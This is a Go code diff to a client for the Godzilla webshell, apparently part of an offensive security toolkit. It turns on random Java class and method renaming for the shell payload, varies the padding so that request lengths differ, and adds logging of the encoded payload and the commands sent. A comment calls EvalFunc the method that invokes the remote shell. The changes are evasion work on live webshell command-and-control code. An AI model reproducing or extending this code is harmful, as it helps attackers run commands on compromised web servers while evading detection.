@@ -127,10 +127,10 @@ func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
 			return nil, err
 		}
 		//payload, err = g.dynamicUpdateClassName("payloadv4", payload)
-		//payload, err = g.dynamicUpdateClassName("payload", payload)
-		//if err != nil {
-		//	return nil, err
-		//}
+		payload, err = g.dynamicUpdateClassName("payload", payload)
+		if err != nil {
+			return nil, err
+		}
 	case ypb.ShellScript_PHP.String():
 		payload, err = hex.DecodeString(godzilla.PhpCodePayload)
 		if err != nil {
@@ -169,13 +169,14 @@ func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) (
 	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"
 
 	// 替换 execCommand() 函数为 execCommand2() 函数, 这里只是暂时一下替换函数名的功能
-	//err = clsObj.SetMethodName("execCommand", "execCommand2")
-	//if err != nil {
-	//	return nil, err
-	//}
-	//g.dynamicFuncName["execCommand"] = "execCommand2"
+	err = clsObj.SetMethodName("getBasicsInfo", "getBasicsInfo2")
+	if err != nil {
+		return nil, err
+	}
+	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo2"
 
 	newClassName := payloads.RandomClassName()
+	//newClassName := "go0pzzz"
 	// 随机替换类名
 	err = clsObj.SetClassName(newClassName)
 	if err != nil {
@@ -183,6 +184,8 @@ func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) (
 	}
 	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
 	g.dynamicFuncName[oldName] = newClassName
+	de := hex.EncodeToString(clsObj.Bytes())
+	log.Infof("base64 encode class: %s", de)
 	return clsObj.Bytes(), nil
 }
 
@@ -229,8 +232,8 @@ func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
 
 // EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
 func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
-	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
-	r1, r2 := utils.RandStringBytes(100), utils.RandStringBytes(10)
+	// 填充随机长度
+	r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
 	parameter.AddString(r1, r2)
 	if className != "" && len(strings.Trim(className, " ")) > 0 {
 		switch g.ShellScript {
@@ -249,6 +252,8 @@ func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Para
 	}
 	parameter.AddString("methodName", funcName)
 	data := parameter.Serialize()
+	log.Infof("send data: %q", string(data))
+
 	//enData, err := g.enCryption(data)
 	enData, err := g.CustomEncoder(data)
 	if err != nil {
@@ -407,7 +412,7 @@ func (g *Godzilla) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) 
 	}
 
 	parameter := newParameter()
-	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
+	basicsInfo, err := g.EvalFunc("", "getBasicsInfo2", parameter)
 	if err != nil {
 		return nil, err
 	}
